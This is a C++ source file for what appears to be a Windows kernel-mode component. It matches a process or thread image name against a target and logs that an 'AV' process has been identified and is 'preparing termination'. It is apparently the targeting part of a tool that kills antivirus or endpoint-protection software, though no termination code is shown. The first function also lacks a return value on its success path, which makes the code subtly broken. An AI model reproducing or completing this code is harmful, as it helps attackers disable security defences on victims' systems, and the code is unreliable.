#include "includes.h"
#include "modules.h"
#include "nt_structs.h"
#include "log.h"
#include "hooks.h"




bool AV::process_extraction( PEPROCESS process, LPCWSTR target_name ) {

    if ( !process || !target_name )
        return false;

    UNICODE_STRING* process_image_name = nullptr;
    auto status = SeLocateProcessImageName( process, &process_image_name );
    HANDLE pid = PsGetProcessId( process );

    if ( !NT_SUCCESS( status ) || !process_image_name || !process_image_name->Buffer )
        return false;

    const WCHAR* buffer = process_image_name->Buffer;
    size_t length = process_image_name->Length / sizeof( WCHAR );

    const WCHAR* filename = buffer + length;
    while ( filename > buffer && *( filename - 1 ) != L'\\' ) {
        --filename;
    }

    const WCHAR* target = target_name;

    while ( *filename && *target ) {
        WCHAR a = *filename++;
        WCHAR b = *target++;

        if ( a != b && tolower( a ) != tolower( b ) ) {
            ExFreePool( process_image_name );
            return false;
        }

    }

    if ( *filename || *target ) {
        ExFreePool( process_image_name );
        return false;
    }

    ExFreePool( process_image_name );
    
    Logger::Print( Logger::Level::Info, "AV Process identified - preparing termination" );

}


bool AV::thread_extraction( PETHREAD thread, LPCWSTR target_name ) {
    if ( !thread || !target_name )
        return false;

    PEPROCESS owning_process = IoThreadToProcess( thread );
    if ( !owning_process )
        return false;

    UNICODE_STRING* process_image_name = nullptr;
    auto status = SeLocateProcessImageName( owning_process, &process_image_name );

    if ( !NT_SUCCESS( status ) || !process_image_name || !process_image_name->Buffer )
        return false;

    const WCHAR* buffer = process_image_name->Buffer;
    size_t length = process_image_name->Length / sizeof( WCHAR );

    const WCHAR* filename = buffer + length;
    while ( filename > buffer && *( filename - 1 ) != L'\\' ) {
        --filename;
    }

    const WCHAR* target = target_name;

    while ( *filename && *target ) {
        WCHAR a = *filename++;
        WCHAR b = *target++;

        if ( a != b && tolower( a ) != tolower( b ) ) {
            ExFreePool( process_image_name );
            return false;
        }
    }

    if ( *filename || *target ) {
        ExFreePool( process_image_name );
        return false;
    }


    ExFreePool( process_image_name );
    Logger::Print( Logger::Level::Info, "AV Thread identified - preparing termination" );
    return true;



}